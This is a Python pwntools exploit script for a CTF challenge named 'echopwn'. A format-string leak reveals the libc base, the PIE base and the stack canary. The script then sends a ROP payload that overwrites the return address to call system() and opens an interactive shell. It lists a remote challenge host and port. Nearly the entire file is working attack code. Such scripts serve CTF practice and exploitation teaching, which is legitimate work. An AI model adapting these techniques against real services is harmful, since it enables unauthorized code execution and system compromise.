from pwn import *

# --- Info ---
# CTF: DEKRA
# Date: -
# Challenge: echopwn
# Description: Simple fmtstr + ROP to bypass canary, PIE, NX and ASLR
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

HOST = '168.119.247.237'
PORT = 5011

pop_rdi = 0x0000000000000973

x = ELF('./echopwn')
libc = ELF('./libc-2.31.so')

offset = 60-8

REMOTE = 0

if(REMOTE):
	r = remote(HOST, PORT)
else:
	r = process('./echopwn',env={'LD_PRELOAD':'./libc-2.31.so'})

#gdb.attach(r)
#pause()

r.sendline('.%3$p' + '.%11$p' + '.%13$p')

# in remote it sends it differently

if(REMOTE):
	r.recv()

t = r.recv().decode().split('.')

libc_base = int(t[1], 16) - 0x3b5980

pie_base = int(t[2], 16) - 0x95d

canary = int(t[3].split('\n')[0], 16)

log.info(f'Leaked: pie_base @ {hex(pie_base)}')
log.info(f'Leaked: libc_base @ {hex(libc_base)}')
log.info(f'Leaked: canary @ {hex(canary)}')


payload = b''
payload += b'A'*offset
payload += p64(canary)
payload += b'B'*8
payload += p64(libc_base + libc.symbols['getpid'])
payload += p64(pie_base + pop_rdi)
payload += p64(libc_base + 0x17da2e)
payload += p64(libc_base + libc.symbols['system'])
payload += p64(pie_base + x.symbols['main'])

r.sendline(payload)

r.interactive()
r.close()


